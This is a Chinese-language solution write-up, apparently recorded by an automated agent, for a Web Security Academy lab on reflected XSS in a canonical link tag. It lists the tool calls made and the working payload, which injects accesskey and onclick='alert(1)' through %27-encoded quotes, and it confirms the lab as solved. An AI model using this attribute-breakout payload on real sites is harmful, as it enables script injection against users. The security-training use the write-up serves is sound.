# lab-canonical-link-tag

- 题面：Reflected XSS in canonical link tag（APPRENTICE）。首页把请求 URL 反射进 `<link rel="canonical" href='...'>`，尖括号被转义；目标=在首页注入一个调用 `alert` 的属性。题面补注：模拟用户会按 `ALT+SHIFT+X` / `CTRL+ALT+X` / `Alt+X`，且官方解仅在 Chrome 可行。
- 实例：`range_launch launch 69D9A58B4BE85FE3DA0E5E65BB0B6655278492C77FCE16B6989C5B40481C66ED --jar /tmp/cj1.json` → `reused:false`，`instance_url=https://0a04007b0414923281d7d577005900fd.web-security-academy.net/`。
- 首触 `http_session get /` 落盘 `/tmp/canon_home.txt`：banner 为 `is-notsolved` / `Not solved`（非跃迁），排除复用假阳性。

## 过程

1. `page_read <lab 页>`：取 widget-lab-id `69D9A58B4BE85FE3DA0E5E65BB0B6655278492C77FCE16B6989C5B40481C66ED`，题面确认无 exploit server 字样。
2. `range_launch launch <id> --jar /tmp/cj1.json`：取实例 base。
3. `http_session get <base>/`：canonical 行为 `href='https://0a04007b.../'`——属性用**单引号**，值即完整 URL。
4. `http_session get "<base>/?%27accesskey=%27x%27onclick=%27alert(1)"`：响应里变成 `href='https://0a04007b.../?'accesskey='x'onclick='alert(1)'`，`%27` 被服务端解码回裸单引号 ⇒ 成功破属性、注入 `accesskey='x'` 与 `onclick='alert(1)'` 两个属性。
5. `page_alert "<crafted url>" --driver "document.querySelector('link[rel=canonical]').click()" --settle-ms 2000`：`alerts:["alert:1"]`、`fired:true`。
6. `banner_verdict <base>/ --jar /tmp/cj1.json`：`solved:true`，`<h4>Congratulations, you solved the lab!</h4>`。

## 判据

- 命中链：URL 反射面落在单引号属性值内，尖括号转义拦不住属性级注入；`%27` 是关键编码形（裸 `'` 亦可，服务端只转义 `<>`）。
- 破属性产物 = `accesskey='x'` + `onclick='alert(1)'`：Chrome 对 `<link>` 上的 accesskey 生效，`ALT+SHIFT+X` 即点击该元素触发 `alert`。
- 件组合：`page_read` → `range_launch` → `http_session`（看反射形态）→ `page_alert`（真 Chrome 触发）→ `banner_verdict`（收口）。无需新件。

## 备注

- 本实例**无 exploit server**：实例首页与 academy 原页均无 exploit 入口，题面也未提交付；故触发是在 crafted URL 上用真 Chrome（CDP）完成——本次用 `click()` 等价触发 `onclick`，未走 `ALT+SHIFT+X` 键路（键路需 CDP 原始键事件，未验证）。
- `http_session` 信封剥 `<script>` 块，对本型无影响；反射点读原文可靠。
- `range_launch` 本次一次成功（非 href 型那种 `instance_url:null`）。

## Links

- evidences: [[xss-context-family]]
